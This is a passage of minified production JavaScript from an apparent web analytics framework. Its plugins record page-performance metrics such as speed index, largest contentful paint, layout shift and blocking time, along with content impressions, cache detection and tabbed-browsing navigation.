                        if (!e || !e.producerId || !e.schemaId) return c.error("The producer id and schema Id must be defined for PageLatencyInstance.");

                        function d() {
                            return i || f
                        }

                        function n() {
                            r = c.UUID()
                        }
                        this.mark = function(n, t) {
                            if (null != n) return t = t || c.time(), n === m && (i = t), c.once(s, function() {
                                o("log", {
                                    messageId: r,
                                    __merge: function(e) {
                                        e.markers[n] = function(e, n) {
                                            return u(0, n - (e || f))
                                        }(d(), t), e.markerTimestamps[n] = l(t)
                                    },
                                    markers: {},
                                    markerTimestamps: {},
                                    navigationStartTimestamp: d() ? new Date(d()).toISOString() : null,
                                    schemaId: e.schemaId
                                }, {
                                    ent: a
                                })
                            }), t
                        }, n(), c.on("$beforePageTransition", n)
                    }

                    function E(e, n) {
                        e === m && (f = n);
                        var t = p.mark(e, n);
                        c.emit("$timing:" + e, t)
                    }

                    function I() {
                        if (!v) {
                            for (var e = 0; e < a.length; e++) r[a[e]] && E(a[e], r[a[e]]);
                            v = 1
                        }
                    }

                    function h() {
                        return !d.hidden || "visible" === d.visibilityState
                    }
                });
                csa.plugin(function(f) {
                    var o, u = "length",
                        c = "parentElement",
                        t = "target",
                        i = "getEntriesByName",
                        e = "perf",
                        n = null,
                        r = "_osrc",
                        l = "_elt",
                        s = "_eid",
                        d = 10,
                        a = 5,
                        g = 10,
                        h = 100,
                        m = f.global,
                        p = f.timeout,
                        v = m.Math,
                        y = v.max,
                        E = v.floor,
                        S = v.ceil,
                        b = m.document,
                        x = m.performance || {},
                        O = (x.timing || {}).navigationStart,
                        w = Date.now,
                        L = Object.values || (f.types || {}).ovl,
                        T = f("PageTiming"),
                        N = f("SpeedIndexBuffers"),
                        I = [],
                        _ = [],
                        k = [],
                        B = [],
                        Y = [],
                        C = .1,
                        F = .1,
                        H = 0,
                        R = 0,
                        V = !0,
                        W = 0,
                        $ = 0,
                        M = 1 == f.config["SpeedIndex.ForceReplay"],
                        P = 0,
                        X = 1,
                        D = 0,
                        J = {},
                        j = [],
                        q = 0,
                        Q = {
                            buffered: 1
                        };

                    function U(e) {
                        f.global.ue_csa_ss_tag || f.emit("$csmTag:" + e, 0, Q)
                    }

                    function z() {
                        for (var e = w(), n = 0; o;) {
                            if (0 !== o[u]) {
                                if (!1 !== o.h(o[0]) && o.shift(), n++, !M && n % d == 0 && w() - e > a) break
                            } else o = o.n
                        }
                        H = 0, o && (H || (!0 === b.hidden ? (M = 1, z()) : f.timeout(z, 0)))
                    }

                    function A(e, n, t, i) {
                        D = E(e), I = n, _ = t, Y = i;
                        var r = b.createTreeWalker(b.body, NodeFilter.SHOW_TEXT, null, null),
                            a = {
                                w: m.innerWidth,
                                h: m.innerHeight,
                                x: m.pageXOffset,
                                y: m.pageYOffset
                            };
                        b.body[l] = e, k.push({
                            w: r,
                            vp: a
                        }), B.push({
                            img: b.images,
                            iter: 0
                        }), I.h = G, (I.n = _).h = K, (_.n = k).h = Z, (k.n = B).h = ee, (B.n = Y).h = ne, o = I, z()
                    }

                    function G(e) {
                        e.m.forEach(function(e) {
                            var n = e[t];
                            r in n || (n[r] = e.oldValue)
                        })
                    }

                    function K(n) {
                        n.m.forEach(function(e) {
                            e[t][l] = n.t - O
                        })
                    }

                    function Z(e) {
                        for (var n, t = e.vp, i = e.w, r = d;
                            (n = i.nextNode()) && 0 < r;) {
                            r -= 1;
                            var a = (n[c] || {}).nodeName;
                            "SCRIPT" !== a && "STYLE" !== a && "NOSCRIPT" !== a && "BODY" !== a && 0 !== (n.nodeValue || "").trim()[u] && oe(n[c], te(n), t)
                        }
                        return !n
                    }

                    function ee(e) {
                        for (var n = {
                                w: m.innerWidth,
                                h: m.innerHeight,
                                x: m.pageXOffset,
                                y: m.pageYOffset
                            }, t = d; e.iter < e.img[u] && 0 < t;) {
                            var i, r = e.img[e.iter],
                                a = ae(r);
                            i = re(a && (r = a).querySelector('[aria-posinset="1"] img') || r), oe(r, i, n), e.iter += 1, t -= 1
                        }
                        return e.img[u] <= e.iter
                    }

                    function ne(e) {
                        var n = [],
                            i = 0,
                            r = 0,
                            a = R,
                            t = E(e.y / h),
                            o = S((e.y + m.innerHeight) / h);
                        j.slice(t, o).forEach(function(e) {
                            (e.elems || []).forEach(function(e) {
                                e.lt in n || (n[e.lt] = {}), e.id in n[e.lt] || (i += (n[e.lt][e.id] = e).a)
                            })
                        }), U("startVL"), L(n).forEach(function(e) {
                            L(e).forEach(function(e) {
                                var n = 1 - r / i,
                                    t = y(e.lt, a);
                                q += n * (t - a), a = t,
                                    function(e, n) {
                                        var t;
                                        for (; C <= 1 && C - .01 <= e;) fe("visuallyLoaded" + (t = (100 * C).toFixed(0)), n.lt), "50" !== t && "90" !== t || f("Content", {
                                            target: n.e
                                        })("mark", "visuallyLoaded" + t), C += F
                                    }((r += e.a) / i, e)
                            })
                        }), U("endVL"), R = e.t - O, Y[u] <= 1 && (fe("speedIndex", q), fe("visuallyLoaded0", D)), V && (V = !1, fe("atfSpeedIndex", q))
                    }

                    function te(e) {
                        for (var n = e[c], t = g; n && 0 < t;) {
                            if (n[l] || 0 === n[l]) return y(n[l], D);
                            n = n.parentElement, t -= 1
                        }
                    }

                    function ie(e, n) {
                        if (e) {
                            if (!e.indexOf("data:")) return te(n);
                            var t = x[i](e) || [];
                            if (0 < t[u]) return y(S(t[0].responseEnd || 0), D)
                        }
                    }

                    function re(e) {
                        return ie(e[r], e) || ie(e.currentSrc, e) || ie(e.src, e)
                    }

                    function ae(e) {
                        for (var n = 10, t = e.parentElement; t && 0 < n;) {
                            if (t.classList && t.classList.contains("a-carousel-viewport")) return t;
                            t = t.parentElement, n -= 1
                        }
                        return null
                    }

                    function oe(e, n, t) {
                        if ((n || 0 === n) && !e[s]) {
                            var i = e.getBoundingClientRect(),
                                r = i.width * i.height,
                                a = i.width / 2,
                                o = X++;
                            if (0 != r && !(a < i.right - t.w || i.right < a)) {
                                for (var f = {
                                        e: e,
                                        lt: n,
                                        a: r,
                                        id: o
                                    }, u = E((i.top + t.y) / h), c = S((i.top + t.y + i.height) / h), l = u; l <= c; l++) l in j || (j[l] = {
                                    elems: [],
                                    lt: 0
                                }), j[l].elems.push(f);
                                e[s] = o
                            }
                        }
                    }

                    function fe(e, n) {
                        T("mark", e, O + S((J[e] = n) || 0))
                    }

                    function ue(e) {
                        P || (U("browserQuite" + e), N("getBuffers", A), P = 1)
                    }
                    O && L && x[i] ? (U(e + "Yes"), N("registerListener", function(e) {
                        $ && (clearTimeout(W), W = p(ue.bind(n, "Mut"), 2500))
                    }), f.once("$unload", function() {
                        M = 1, ue("Ud")
                    }), f.once("$load", function() {
                        $ = 1, W = p(ue.bind(n, "Ld"), 2500)
                    }), f.once("$timing:functional", ue.bind(n, "Fn")), f.register("SpeedIndex", {
                        getMarkers: function(e) {
                            e && e(JSON.parse(JSON.stringify(J)))
                        }
                    })) : U(e + "No")
                });
                csa.plugin(function(e) {
                    var m = !!e.config["LCP.elementDedup"],
                        t = !1,
                        n = e("PageTiming"),
                        r = e.global.PerformanceObserver,
                        a = e.global.performance;

                    function i() {
                        return a.timing.navigationStart
                    }

                    function o() {
                        t || function(o) {
                            var l = new r(function(e) {
                                var t = e.getEntries();
                                if (0 !== t.length) {
                                    var n = t[t.length - 1];
                                    if (m && "" !== n.id && n.element && "IMG" === n.element.tagName) {
                                        for (var r = {}, a = t[0], i = 0; i < t.length; i++) t[i].id in r || ("" !== t[i].id && (r[t[i].id] = !0), a.startTime < t[i].startTime && (a = t[i]));
                                        n = a
                                    }
                                    l.disconnect(), o({
                                        startTime: n.startTime,
                                        renderTime: n.renderTime,
                                        loadTime: n.loadTime
                                    })
                                }
                            });
                            try {
                                l.observe({
                                    type: "largest-contentful-paint",
                                    buffered: !0
                                })
                            } catch (e) {}
                        }(function(e) {
                            e && (t = !0, n("mark", "largestContentfulPaint", Math.floor(e.startTime + i())), e.renderTime && n("mark", "largestContentfulPaint.render", Math.floor(e.renderTime + i())), e.loadTime && n("mark", "largestContentfulPaint.load", Math.floor(e.loadTime + i())))
                        })
                    }
                    r && a && a.timing && (e.once("$unload", o), e.once("$load", o), e.register("LargestContentfulPaint", {}))
                });
                csa.plugin(function(r) {
                    var e = r("Metrics", {
                            producerId: "csa"
                        }),
                        n = r.global.PerformanceObserver;
                    n && (n = new n(function(r) {
                        var t = r.getEntries();
                        if (0 === t.length || !t[0].processingStart || !t[0].startTime) return;
                        ! function(r) {
                            r = r || 0, n.disconnect(), 0 <= r ? e("recordMetric", "firstInputDelay", r) : e("recordMetric", "firstInputDelay.invalid", 1)
                        }(t[0].processingStart - t[0].startTime)
                    }), function() {
                        try {
                            n.observe({
                                type: "first-input",
                                buffered: !0
                            })
                        } catch (r) {}
                    }())
                });
                csa.plugin(function(d) {
                    var e = "Metrics",
                        u = 0;

                    function r(i) {
                        var t, e = i.producerId,
                            r = i.logger,
                            c = r || d("Events", {
                                producerId: e
                            }),
                            o = (i || {}).dimensions || {},
                            n = -1;
                        if (!e && !r) return d.error("Either a producer id or custom logger must be defined");

                        function s() {
                            n !== u && (t = d.UUID(), n = u)
                        }
                        this.recordMetric = function(r, n) {
                            var e = i.logOptions || {
                                ent: {
                                    page: ["pageType", "subPageType", "requestId"]
                                }
                            };
                            e.debugMetric = i.debugMetric, s(), c("log", {
                                messageId: t,
                                schemaId: i.schemaId || "<ns>.Metric.3",
                                metrics: {},
                                dimensions: o,
                                __merge: function(e) {
                                    e.metrics[r] = n
                                }
                            }, e)
                        }
                    }
                    d.config["KillSwitch." + e] || (new r({
                        producerId: "csa"
                    }).recordMetric("baselineMetricEvent", 1), d.on("$beforePageTransition", function() {
                        u++
                    }), d.register(e, {
                        instance: function(e) {
                            return new r(e || {})
                        }
                    }))
                });
                csa.plugin(function(t) {
                    var a, r = (t.global.performance || {}).timing,
                        s = (r || {}).navigationStart || t.time();

                    function e() {
                        a = t.UUID()
                    }

                    function n(i) {
                        var r = (i = i || {}).producerId,
                            e = i.logger,
                            o = e || t("Events", {
                                producerId: r
                            });
                        if (!r && !e) return t.error("Either a producer id or custom logger must be defined");
                        this.mark = function(e, r) {
                            var n = (void 0 === r ? t.time() : r) - s;
                            o("log", {
                                messageId: a,
                                schemaId: i.schemaId || "<ns>.Timer.1",
                                markers: {},
                                __merge: function(r) {
                                    r.markers[e] = n
                                }
                            }, i.logOptions)
                        }
                    }
                    r && (e(), t.on("$beforePageTransition", e), t.register("Timers", {
                        instance: function(r) {
                            return new n(r || {})
                        }
                    }))
                });
                csa.plugin(function(t) {
                    var e = "takeRecords",
                        i = "disconnect",
                        n = "function",
                        o = t("Metrics", {
                            producerId: "csa"
                        }),
                        c = t("PageTiming"),
                        a = t.global,
                        u = t.timeout,
                        r = t.on,
                        f = a.PerformanceObserver,
                        m = 0,
                        l = !1,
                        s = 0,
                        d = a.performance,
                        h = a.document,
                        v = null,
                        y = !1,
                        g = t.blank;

                    function p() {
                        l || (l = !0, clearTimeout(v), typeof f[e] === n && f[e](), typeof f[i] === n && f[i](), o("recordMetric", "documentCumulativeLayoutShift", m), c("mark", "cumulativeLayoutShiftLastTimestamp", Math.floor(s + d.timing.navigationStart)))
                    }
                    f && d && d.timing && h && (f = new f(function(t) {
                        v && clearTimeout(v);
                        t.getEntries().forEach(function(t) {
                            t.hadRecentInput || (m += t.value, s < t.startTime && (s = t.startTime))
                        }), v = u(p, 5e3)
                    }), function() {
                        try {
                            f.observe({
                                type: "layout-shift",
                                buffered: !0
                            }), v = u(p, 5e3)
                        } catch (t) {}
                    }(), g = r(h, "click", function(t) {
                        y || (y = !0, o("recordMetric", "documentCumulativeLayoutShiftToFirstInput", m), g())
                    }), r(h, "visibilitychange", function() {
                        "hidden" === h.visibilityState && p()
                    }), t.once("$unload", p))
                });
                csa.plugin(function(e) {
                    var t, n = e.global,
                        r = n.PerformanceObserver,
                        c = e("Metrics", {
                            producerId: "csa"
                        }),
                        o = 0,
                        i = 0,
                        a = -1,
                        l = n.Math,
                        f = l.max,
                        u = l.ceil;
                    if (r) {
                        t = new r(function(e) {
                            e.getEntries().forEach(function(e) {
                                var t = e.duration;
                                o += t, i += t, a = f(t, a)
                            })
                        });
                        try {
                            t.observe({
                                type: "longtask",
                                buffered: !0
                            })
                        } catch (e) {}
                        t = new r(function(e) {
                            0 < e.getEntries().length && (i = 0, a = -1)
                        });
                        try {
                            t.observe({
                                type: "largest-contentful-paint",
                                buffered: !0
                            })
                        } catch (e) {}
                        e.on("$unload", g), e.on("$beforePageTransition", g)
                    }

                    function g() {
                        c("recordMetric", "totalBlockingTime", u(i || 0)), c("recordMetric", "totalBlockingTimeInclLCP", u(o || 0)), c("recordMetric", "maxBlockingTime", u(a || 0)), i = o = 0, a = -1
                    }
                });
                csa.plugin(function(r) {
                    var e = "CacheDetection",
                        o = "csa-ctoken-",
                        n = r.store,
                        t = r.deleteStored,
                        c = r.config,
                        a = c[e + ".RequestID"],
                        i = c[e + ".Callback"],
                        s = r.global,
                        u = s.document || {},
                        d = s.Date,
                        f = r("Events"),
                        l = r("Events", {
                            producerId: "csa"
                        });

                    function p(e) {
                        try {
                            var n = u.cookie.match(RegExp("(^| )" + e + "=([^;]+)"));
                            return n && n[2].trim()
                        } catch (e) {}
                    }! function() {
                        var e = function() {
                                var e = p("cdn-rid");
                                if (e) return {
                                    r: e,
                                    s: "cdn"
                                }
                            }() || function() {
                                if (r.store(o + a)) return {
                                    r: r.UUID().toUpperCase().replace(/-/g, "").slice(0, 20),
                                    s: "device"
                                }
                            }() || {},
                            n = e.r,
                            c = e.s;
                        if (!!n) {
                            var t = p("session-id");
                            ! function(e, n, c, t) {
                                f("setEntity", {
                                    page: {
                                        pageSource: "cache",
                                        requestId: e,
                                        cacheRequestId: a,
                                        cacheSource: t
                                    },
                                    session: {
                                        id: c
                                    }
                                })
                            }(n, 0, t, c), "device" === c && l("log", {
                                schemaId: "<ns>.CacheImpression.1"
                            }, {
                                ent: "all"
                            }), i && i(n, t, c)
                        }
                    }(), n(o + a, d.now() + 36e5), r.once("$load", function() {
                        var c = d.now();
                        t(function(e, n) {
                            return 0 == e.indexOf(o) && parseInt(n) < c
                        })
                    })
                });
                csa.plugin(function(u) {
                    var i, t = "Content",
                        e = "MutationObserver",
                        n = "addedNodes",
                        a = "querySelectorAll",
                        f = "matches",
                        o = "getAttributeNames",
                        r = "getAttribute",
                        s = "dataset",
                        c = "widget",
                        l = "producerId",
                        d = {
                            ent: {
                                element: 1,
                                page: ["pageType", "subPageType", "requestId"]
                            }
                        },
                        h = 5,
                        g = u.config[t + ".BubbleUp.SearchDepth"] || 20,
                        p = u.config[t + ".SearchPage"] || 0,
                        m = "csaC",
                        y = m + "Id",
                        v = "logRender",
                        b = {},
                        E = u.config,
                        w = E[t + ".Selectors"] || [],
                        I = E[t + ".WhitelistedAttributes"] || {
                            href: 1,
                            class: 1
                        },
                        O = E[t + ".EnableContentEntities"],
                        C = E["KillSwitch.ContentRendered"],
                        N = u.global,
                        k = N.document || {},
                        A = k.documentElement,
                        S = N.HTMLElement,
                        U = {},
                        L = [],
                        R = function(t, e, n, i) {
                            var r = this,
                                o = u("Events", {
                                    producerId: t || "csa"
                                });
                            e.type = e.type || c, r.id = e.id, r.l = o, r.e = e, r.el = n, r.rt = i, r.dlo = d, r.op = H(n, "csaOp"), r.log = function(t, e) {
                                o("log", t, e || d)
                            }, e.id && o("setEntity", {
                                element: e
                            })
                        },
                        _ = R.prototype;

                    function j(t) {
                        var e = (t = t || {}).element,
                            n = t.target;
                        return e ? function(t, e) {
                            var n;
                            n = t instanceof S ? $(t) || B(e[l], t, K, u.time()) : U[t.id] || Y(e[l], 0, t, u.time());
                            return n
                        }(e, t) : n ? x(n) : u.error("No element or target argument provided.")
                    }

                    function x(t) {
                        var e = function(t) {
                            var e = null,
                                n = 0;
                            t = t.parentElement;
                            for (; t && n < g;) {
                                if (n++, D(t, y)) {
                                    e = t;
                                    break
                                }
                                t = t.parentElement
                            }
                            return e
                        }(t);
                        return e ? $(e) : new R("csa", {
                            id: null
                        }, null, u.time())
                    }

                    function D(t, e) {
                        if (t && t.dataset) return t.dataset[e]
                    }

                    function M(t, e, n) {
                        L.push({
                            n: n,
                            e: t,
                            t: e
                        }), T()
                    }

                    function P() {
                        for (var t = u.time(), e = 0; 0 < L.length;) {
                            var n = L.shift();
                            if (b[n.n](n.e, n.t), ++e % 10 == 0 && u.time() - t > h) break
                        }
                        i = 0, L.length && T()
                    }

                    function T() {
                        i = i || u.raf(P)
                    }

                    function q(t, e, n) {
                        return {
                            n: t,
                            e: e,
                            t: n
                        }
                    }

                    function B(t, e, n, i) {
                        var r = u.UUID(),
                            o = {
                                id: r
                            },
                            c = x(e);
                        return e[s][y] = r, n(o, e), c && c.id && (o.parentId = c.id), Y(t, e, o, i)
                    }

                    function X(t) {
                        return isNaN(t) ? null : Math.round(t)
                    }

                    function Y(t, e, n, i) {
                        O && (n.schemaId = "<ns>.ContentEntity.2"), n.id = n.id || u.UUID();
                        var r = new R(t, n, e, i);
                        return function(t) {
                            return !C && ((t.op || {}).hasOwnProperty(v) || p)
                        }(r) && function(t, e) {
                            var n = {},
                                i = u.exec(X);
                            t.el && (n = t.el.getBoundingClientRect()), t.log({
                                schemaId: "<ns>.ContentRender.2",
                                timestamp: e,
                                width: i(n.width),
                                height: i(n.height),
                                positionX: i(n.left + N.pageXOffset),
                                positionY: i(n.top + N.pageYOffset)
                            })
                        }(r, i), u.emit("$content.register", r), U[n.id] = r
                    }

                    function $(t) {
                        return U[(t[s] || {})[y]]
                    }

                    function H(n, i) {
                        var r = {};
                        return o in (n = n || {}) && Object.keys(n[s]).forEach(function(t) {
                            if (!t.indexOf(i) && i.length < t.length) {
                                var e = function(t) {
                                    return (t[0] || "").toLowerCase() + t.slice(1)
                                }(t.slice(i.length));
                                r[e] = n[s][t]
                            }
                        }), r
                    }

                    function K(t, e) {
                        o in e && (function(t, e) {
                            var n = H(t, m);
                            Object.keys(n).forEach(function(t) {
                                e[t] = n[t]
                            })
                        }(e, t), function(e, n) {
                            (e[o]() || []).forEach(function(t) {
                                t in I && (n[t] = e[r](t))
                            })
                        }(e, t))
                    }
                    A && k[a] && N[e] && (w.push({
                        selector: "*[data-csa-c-type]",
                        entity: K
                    }), w.push({
                        selector: ".celwidget",
                        entity: function(t, e) {
                            K(t, e), t.slotId = t.slotId || e[r]("cel_widget_id") || e.id, t.legacyId = e[r]("cel_widget_id") || e.id, t.type = t.type || c
                        }
                    }), b[1] = function(t, e) {
                        t.forEach(function(t) {
                            t[n] && t[n].constructor && "NodeList" === t[n].constructor.name && Array.prototype.forEach.call(t[n], function(t) {
                                L.unshift(q(2, t, e))
                            })
                        })
                    }, b[2] = function(o, c) {
                        a in o && f in o && w.forEach(function(t) {
                            for (var e = t.selector, n = o[f](e), i = o[a](e), r = i.length - 1; 0 <= r; r--) L.unshift(q(3, {
                                e: i[r],
                                s: t
                            }, c));
                            n && L.unshift(q(3, {
                                e: o,
                                s: t
                            }, c))
                        })
                    }, b[3] = function(t, e) {
                        var n = t.e;
                        $(n) || B("csa", n, t.s.entity, e)
                    }, b[4] = function() {
                        u.register(t, {
                            instance: j
                        })
                    }, new N[e](function(t) {
                        M(t, u.time(), 1)
                    }).observe(A, {
                        childList: !0,
                        subtree: !0
                    }), M(A, u.time(), 2), M(null, u.time(), 4), u.on("$content.export", function(e) {
                        Object.keys(e).forEach(function(t) {
                            _[t] = e[t]
                        })
                    }))
                });
                csa.plugin(function(o) {
                    var i, t = "ContentImpressions",
                        e = "KillSwitch.",
                        n = "IntersectionObserver",
                        r = "getAttribute",
                        s = "dataset",
                        c = "intersectionRatio",
                        a = "csaCId",
                        m = 1e3,
                        l = o.global,
                        f = o.config,
                        u = f[e + t],
                        v = f[e + t + ".ContentViews"],
                        g = ((l.performance || {}).timing || {}).navigationStart || o.time(),
                        d = {};

                    function h(t) {
                        t && (t.v = 1, function(t) {
                            t.vt = o.time(), t.el.log({
                                schemaId: "<ns>.ContentView.3",
                                timeToViewed: t.vt - t.el.rt,
                                pageFirstPaintToElementViewed: t.vt - g
                            })
                        }(t))
                    }

                    function I(t) {
                        t && !t.it && (t.i = o.time() - t.is > m, function(t) {
                            t.it = o.time(), t.el.log({
                                schemaId: "<ns>.ContentImpressed.2",
                                timeToImpressed: t.it - t.el.rt,
                                pageFirstPaintToElementImpressed: t.it - g
                            })
                        }(t))
                    }!u && l[n] && (i = new l[n](function(t) {
                        var n = o.time();
                        t.forEach(function(t) {
                            var e = function(t) {
                                if (t && t[r]) return d[t[s][a]]
                            }(t.target);
                            if (e) {
                                o.emit("$content.intersection", {
                                    meta: e.el,
                                    t: n,
                                    e: t
                                });
                                var i = t.intersectionRect;
                                t.isIntersecting && 0 < i.width && 0 < i.height && (v || e.v || h(e), .5 <= t[c] && !e.is && (e.is = n, e.timer = o.timeout(function() {
                                    I(e)
                                }, m))), t[c] < .5 && !e.it && e.timer && (l.clearTimeout(e.timer), e.is = 0, e.timer = 0)
                            }
                        })
                    }, {
                        threshold: [0, .5, .99]
                    }), o.on("$content.register", function(t) {
                        var e = t.el;
                        e && (d[t.id] = {
                            el: t,
                            v: 0,
                            i: 0,
                            is: 0,
                            vt: 0,
                            it: 0
                        }, i.observe(e))
                    }))
                });
                csa.plugin(function(e) {
                    e.config["KillSwitch.ContentLatency"] || e.emit("$content.export", {
                        mark: function(t, n) {
                            var o = this;
                            o.t || (o.t = e("Timers", {
                                logger: o.l,
                                schemaId: "<ns>.ContentLatency.1",
                                logOptions: o.dlo
                            })), o.t("mark", t, n)
                        }
                    })
                });
                csa.plugin(function(t) {
                    function n(i, e, o) {
                        var c = {};

                        function r(t, n, e) {
                            t in c && o <= n - c[t].s && (function(n, e, i) {
                                if (!p) return;
                                S(function(t) {
                                    T(n, t), t.w[n][e] = a((t.w[n][e] || 0) + i)
                                })
                            }(t, i, n - c[t].d), c[t].d = n), e || delete c[t]
                        }
                        this.update = function(t, n) {
                            n.isIntersecting && e <= n.intersectionRatio ? function(t, n) {
                                t in c || (c[t] = {
                                    s: n,
                                    d: n
                                })
                            }(t, s()) : r(t, s())
                        }, this.stopAll = function(t) {
                            var n = s();
                            for (var e in c) r(e, n, t)
                        }, this.reset = function() {
                            var t = s();
                            for (var n in c) c[n].s = t, c[n].d = t
                        }
                    }
                    var e = t.config,
                        s = t.time,
                        i = "ContentInteractionsSummary",
                        o = e[i + ".FlushInterval"],
                        c = e[i + ".FlushBackoff"] || 1.5,
                        r = t.global,
                        u = t.on,
                        a = Math.floor,
                        f = (r.document || {}).documentElement || {},
                        l = ((r.performance || {}).timing || {}).responseStart || t.time(),
                        d = o,
                        m = 0,
                        p = !0,
                        v = t.UUID(),
                        g = t("Events", {
                            producerId: "csa"
                        }),
                        I = new n("it0", 0, 0),
                        w = new n("it50", .5, 1e3),
                        h = new n("it100", .99, 0),
                        A = {},
                        b = {};

                    function $() {
                        I.stopAll(!0), w.stopAll(!0), h.stopAll(!0), U()
                    }

                    function C() {
                        I.reset(), w.reset(), h.reset(), U()
                    }

                    function U() {
                        d && (clearTimeout(m), m = t.timeout($, d), d *= c)
                    }

                    function E(n) {
                        S(function(t) {
                            T(n, t), t.w[n].mc = (t.w[n].mc || 0) + 1
                        })
                    }

                    function S(t) {
                        g("log", {
                            messageId: v,
                            schemaId: "<ns>.ContentInteractionsSummary.1",
                            w: {},
                            __merge: t
                        }, {
                            ent: {
                                page: ["requestId"]
                            }
                        })
                    }

                    function T(t, n) {
                        t in n.w || (n.w[t] = {})
                    }
                    u("$content.intersection", function(t) {
                        if (t && t.meta && t.e) {
                            var n = t.meta.id;
                            if (n in A) {
                                var e = t.e.boundingClientRect || {};
                                0 !== e.width && 0 !== e.height && (I.update(n, t.e), w.update(n, t.e), h.update(n, t.e), !t.e.isIntersecting || n in b || (b[n] = 1, function(n, e) {
                                    S(function(t) {
                                        T(n, t), t.w[n].ttfv = a(e)
                                    })
                                }(n, s() - l)))
                            }
                        }
                    }), u("$content.register", function(t) {
                        (t.e || {}).slotId && (A[t.id] = {}, function(e) {
                            S(function(t) {
                                var n = e.id;
                                T(n, t), t.w[n].sid = (e.e || {}).slotId, t.w[n].cid = (e.e || {}).contentId
                            })
                        }(t))
                    }), u("$beforePageTransition", function() {
                        $(), C(), v = t.UUID(), U()
                    }), u("$beforeunload", function() {
                        I.stopAll(), w.stopAll(), h.stopAll()
                    }), u("$visible", function(t) {
                        t ? C() : ($(), clearTimeout(m)), p = t
                    }, {
                        buffered: 1
                    }), u(f, "click", function(t) {
                        for (var n = t.target, e = 25; n && 0 < e;) {
                            var i = (n.dataset || {}).csaCId;
                            i && E(i), n = n.parentElement, e -= 1
                        }
                    }, {
                        capture: !0,
                        passive: !0
                    }), U()
                });
                csa.plugin(function(o) {
                    var t, n, i = "normal",
                        s = "reload",
                        e = "history",
                        d = "new-tab",
                        a = "ajax",
                        r = 1,
                        c = 2,
                        u = "lastActive",
                        l = "lastInteraction",
                        f = "used",
                        p = "csa-tabbed-browsing",
                        g = "visibilityState",
                        v = {
                            "back-memory-cache": 1,
                            "tab-switch": 1,
                            "history-navigation-page-cache": 1
                        },
                        b = "<ns>.TabbedBrowsing.2",
                        m = "visible",
                        y = o.global,
                        I = o("Events", {
                            producerId: "csa"
                        }),
                        h = y.location || {},
                        T = y.document,
                        w = y.JSON,
                        z = ((y.performance || {}).navigation || {}).type,
                        P = o.store,
                        S = o.on,
                        k = o.storageSupport(),
                        x = !1,
                        A = {},
                        C = {},
                        O = {},
                        $ = {},
                        j = !1,
                        q = !1,
                        B = !1;

                    function E(i) {
                        try {
                            return w.parse(P(p, void 0, {
                                session: i
                            }) || "{}") || {}
                        } catch (i) {
                            o.error('Could not parse storage value for key "' + p + '": ' + i)
                        }
                        return {}
                    }

                    function J(i, t) {
                        P(p, w.stringify(t || {}), {
                            session: i
                        })
                    }

                    function N(i) {
                        var t = C.tid || i.id,
                            n = A[u] || {};
                        n.tid === t && (n.pid = i.id), $ = {
                            pid: i.id,
                            tid: t,
                            lastInteraction: C[l] || {},
                            initialized: !0
                        }, O = {
                            lastActive: n,
                            lastInteraction: A[l] || {},
                            time: o.time()
                        }
                    }

                    function D(i) {
                        var t = i === d,
                            n = T.referrer,
                            e = !(n && n.length) || !~n.indexOf(h.origin || ""),
                            a = t && e,
                            r = {
                                type: i,
                                toTabId: $.tid,
                                toPageId: $.pid,
                                transitTime: o.time() - A.time || null
                            };
                        a || function(i, t, n) {
                            var e = i === s,
                                a = t ? A[u] || {} : C,
                                r = A[l] || {},
                                o = C[l] || {},
                                d = t ? r : o;
                            n.fromTabId = a.tid, n.fromPageId = a.pid, e || !d.id || d[f] || (n.interactionId = d.id || null, r.id === d.id && (r[f] = !0), o.id === d.id && (o[f] = !0))
                        }(i, t, r), I("log", {
                            navigation: r,
                            schemaId: b
                        }, {
                            ent: {
                                page: ["pageType", "subPageType", "requestId"]
                            }
                        })
                    }

                    function F(i) {
                        B = function(i) {
                                return i && i in v
                            }(i.transitionType),
                            function() {
                                A = E(!1), C = E(!0);
                                var i = A[l],
                                    t = C[l],
                                    n = !1,
                                    e = !1;
                                i && t && i.id === t.id && i[f] !== t[f] && (n = !i[f], e = !t[f], t[f] = i[f] = !0, n && J(!1, A), e && J(!0, C))
                            }(), N(i), j = !0,
                            function(i) {
                                var t, n;
                                t = H(), n = K(), (t || n) && N(i)
                            }(i)
                    }

                    function G() {
                        x && !B ? D(a) : (x = !0, D(z === c || B ? e : z === r ? C.initialized ? s : d : C.initialized ? i : d))
                    }

                    function H() {
                        return !(!j || !t) && (C[l] = {
                            id: t.messageId,
                            used: !(A[l] = {
                                id: t.messageId,
                                used: !1
                            })
                        }, !(t = null))
                    }

                    function K() {
                        var i = !1;
                        if (q = T[g] === m, j) {
                            var t = A[u] || {};
                            i = function(i, t, n) {
                                var e = !1,
                                    a = i[u];
                                return q ? a && a.tid === $.tid && a[m] && a.pid === n || (i[u] = {
                                    visible: !0,
                                    pid: n,
                                    tid: t
                                }, e = !0) : a && a.tid === $.tid && a[m] && (e = !(a[m] = !1)), e
                            }(A, C.tid || t.tid || $.tid, C.pid || t.pid || $.pid)
                        }
                        return i
                    }
                    k.local && k.session && w && T && g in T && (n = function() {
                        try {
                            return y.self !== y.top
                        } catch (i) {
                            return !0
                        }
                    }(), S("$pageChange", function(i) {
                        n || (F(i), G(), J(!1, O), J(!0, $), C = $, A = O)
                    }, {
                        buffered: 1
                    }), S("$content.interaction", function(i) {
                        t = i, H() && (J(!1, A), J(!0, C))
                    }), S(T, "visibilitychange", function() {
                        !n && K() && J(!1, A)
                    }, {
                        capture: !1,
                        passive: !0
                    }))
                });
                csa.plugin(function(c) {
                    var e = c("Metrics", {
                        producerId: "csa"
                    });
                    c.on(c.global, "pageshow", function(c) {
                        c && c.persisted && e("recordMetric", "bfCache", 1)
                    })
                });
                csa.plugin(function(n) {
                    var e, r, a, c, u, f, s, l, d, m, p, t = "hasFocus",
                        i = "$app.",
                        o = "avail",
                        g = "client",
                        v = "document",
                        h = "inner",
                        b = "offset",
                        y = "screen",
                        S = "scroll",
                        T = "Width",
                        $ = "Height",
                        I = o + T,
                        P = o + $,
                        w = g + T,
                        D = g + $,
                        E = h + T,
                        F = h + $,
                        O = b + T,
                        q = b + $,
                        x = S + T,
                        z = S + $,
                        C = n.config["KillSwitch.PageInteractionsSummary"],
                        H = n("Events", {
                            producerId: "csa"
                        }),
                        K = 1,
                        M = n.global || {},
                        W = n.time,
                        X = n.on,
                        Y = n.once,
                        j = M[v] || {},
                        k = M[y] || {},
                        A = M.Math || {},
                        B = A.abs,
                        G = A.max,
                        J = A.ceil,
                        L = ((M.performance || {}).timing || {}).responseStart,
                        N = function() {
                            return j[t]()
                        },
